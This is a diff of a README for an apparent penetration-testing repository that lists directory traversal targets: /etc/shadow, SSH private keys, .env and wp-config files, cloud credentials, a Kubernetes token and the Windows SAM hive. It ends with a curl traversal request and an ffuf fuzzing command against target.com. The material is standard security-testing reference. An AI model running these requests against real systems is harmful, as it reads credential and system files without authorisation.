@@ -1,61 +1,59 @@
-# Directory_Traversal_File_Path_you_check
+# Directory Traversal Payload List
 
-# Linux -:
-/etc/passwd
-/etc/shadow
-/etc/group
-/etc/hosts
-/etc/hostname
-/etc/issue
-/etc/os-release
-/root/.ssh/id_rsa
-/root/.ssh/authorized_keys
-/home/root/.ssh/id_rsa
-/home/root/.bash_history
-/home/admin/.ssh/id_rsa
-/home/admin/.bash_history
-/home/<user>/.ssh/id_rsa
-/home/<user>/.ssh/authorized_keys
-/home/<user>/.bash_history
-/etc/mysql/my.cnf
-/var/lib/mysql/mysql/user.MYD
-/var/www/html/config.php
-/var/www/html/.env
-/var/www/html/config/config.inc.php
-/var/www/html/wp-config.php
-/opt/tomcat/conf/tomcat-users.xml
-/etc/httpd/conf/httpd.conf
-/etc/apache2/apache2.conf
-/etc/nginx/nginx.conf
-/etc/phpmyadmin/config.inc.php
-/etc/samba/smb.conf
-/etc/proftpd/proftpd.conf
-/var/log/auth.log
-/var/log/secure
-/var/log/apache2/access.log
-/var/log/apache2/error.log
-/var/log/nginx/access.log
-/var/log/nginx/error.log
-/var/log/mysql/error.log
-/var/log/messages
-/var/log/syslog
-/home/<user>/.pm2/logs/
-/proc/self/environ
-/proc/self/cmdline
-/proc/self/status
-/proc/net/tcp
-/root/.aws/credentials
-/home/<user>/.aws/credentials
-/root/.azure/credentials
-/root/.config/gcloud/credentials.db
-/var/run/secrets/kubernetes.io/serviceaccount/token
-/var/lib/docker/
+This repository contains a curated list of **directory traversal / path traversal** payloads.  
+Use this for **educational purposes, bug bounty, or penetration testing** only.  
 
-# Windows -:
-C:\Windows\System32\drivers\etc\hosts
-C:\Windows\win.ini
-C:\Windows\System32\config\SAM
-C:\Windows\System32\config\SYSTEM
-C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
-C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
-C:\Users\<user>\.ssh\id_rsa
+---
+
+## 🖥 System Files
+- /etc/passwd
+- /etc/shadow
+- /etc/group
+- /etc/hosts
+- /etc/hostname
+- /etc/issue
+- /etc/os-release
+
+## 🔑 Credentials
+- /root/.ssh/id_rsa
+- /home/<user>/.ssh/id_rsa
+- /etc/mysql/my.cnf
+- /var/www/html/config.php
+- /var/www/html/wp-config.php
+- /var/www/html/.env
+
+## 🌐 Web Configs
+- /etc/apache2/apache2.conf
+- /etc/nginx/nginx.conf
+- /etc/phpmyadmin/config.inc.php
+
+## 📝 Logs
+- /var/log/auth.log
+- /var/log/apache2/error.log
+- /var/log/nginx/access.log
+- /var/log/syslog
+
+## 🛠 Process
+- /proc/self/environ
+- /proc/self/cmdline
+
+## ☁️ Cloud / Containers
+- /root/.aws/credentials
+- /var/run/secrets/kubernetes.io/serviceaccount/token
+- /var/lib/docker/
+
+## 🖥 Windows
+- C:\Windows\System32\drivers\etc\hosts
+- C:\Windows\System32\config\SAM
+- C:\Users\<user>\.ssh\id_rsa
+- C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+
+---
+
+## 🔧 Usage Example
+```bash
+# Linux
+curl "http://target.com/download?file=../../../../etc/passwd"
+
+# Fuzz with ffuf
+ffuf -u http://target.com/download?file=FUZZ -w traversal.txt
